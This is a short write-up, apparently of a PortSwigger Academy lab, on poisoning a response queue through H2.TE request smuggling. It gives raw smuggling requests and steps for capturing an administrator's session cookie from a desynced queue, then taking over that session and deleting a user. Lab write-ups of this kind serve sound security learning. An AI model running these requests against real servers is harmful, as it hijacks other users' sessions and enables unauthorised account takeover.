# [Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)

> get the admin session key, update the session with that key and delete carlos as admin

- the lab has a `H2.TE` vulnerability -> frontend `HTTP2`, backend `HTTP1` + `Transfer-Encoding`

## recon

- have two request ready

> first:

- keep the `Content-Length` not updated

```
POST / HTTP/2
Host: xxx.web-security-academy.net
Transfer-Encoding: chunked

0

GET /qweqwe HTTP/1.1
X-Ignore: x
```

- this will leave the `GET` request for the next request

> second is a `/` request

- it should give back a `404` not found response

## exploit

- you smuggle a complete request
- so the back-end sees two requests but the front-end sent one
- the back-end sends two responses
- the front-end gives you the first and queues the extra
- this desyncs the queue
- now the admin’s request gets your leftover 404 response
- the admin’s real response gets queued, what lands on your next request

```
POST /asdasd HTTP/2
Host: xxx.web-security-academy.net
Transfer-Encoding: chunked

0

GET /qweqwex HTTP/1.1
Host: xxx.web-security-academy.net


```

- there is a `\r\n` after the second `Host`
- send this request repeatedly and check only the 302 response
- that should look something like this:

```
HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=xxx; ...
```

- copy the session cookie and paste it in your session
- it will switch to admin
- delete **carlos**
